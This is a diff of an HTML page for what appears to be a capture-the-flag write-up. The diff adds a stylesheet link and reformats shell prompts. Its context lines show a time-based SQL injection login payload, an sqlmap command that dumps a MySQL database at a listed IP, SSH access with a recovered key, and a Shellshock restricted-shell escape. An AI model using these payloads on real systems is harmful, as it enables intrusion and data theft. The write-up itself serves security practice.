@@ -26,6 +26,7 @@
   
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.4.0/jquery.fancybox.min.css" />
   
   
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
@@ -411,7 +412,7 @@ username=th1b4ud' OR SLEEP(3)#&amp;password=password&amp;login=Login
 <li><strong>Action to perform</strong> : dump the database with <code>--dump</code></li>
 </ul>
 
-<pre><code>th1b4ud@th1b4ud-pc $ sqlmap -u &quot;http://51.75.202.113:2077/zetatech-admin.php&quot; --data &quot;username=test&amp;password=test&amp;login=Login&quot; -p &quot;username&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ sqlmap -u &quot;http://51.75.202.113:2077/zetatech-admin.php&quot; --data &quot;username=test&amp;password=test&amp;login=Login&quot; -p &quot;username&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
         ___
        __H__
  ___ ___[.]_____ ___ ___  {1.2.11#stable}
@@ -529,7 +530,7 @@ ncjE2bXV8Kbzf5ifvikciUMTxnF7l+PehJulNP2+Mk5NBXOAcZdjO7sfxA==
 
 <p>Why not try a ssh connexion with the username <code>puppet-master</code> on the port <code>2021</code> (see description)</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key
 
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
@@ -581,7 +582,7 @@ ssh restricted@10.20.30.40 -t &quot;() { :; }; /bin/bash&quot;
 
 <p>Let&rsquo;s try this 3 commands</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;/bin/sh&quot;
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;/bin/sh&quot;
 
 [...]
 
@@ -590,7 +591,7 @@ Connection to 51.75.202.113 closed.
 
 <p>No</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;bash --noprofile&quot;
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;bash --noprofile&quot;
 
 [...]
 
@@ -599,7 +600,7 @@ Connection to 51.75.202.113 closed.
 
 <p>No</p>
 
-<pre><code>th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;() { :; }; /bin/bash&quot;
+<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;() { :; }; /bin/bash&quot;
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
 ./__.[___  |  |  |  |  [___\__.|  |
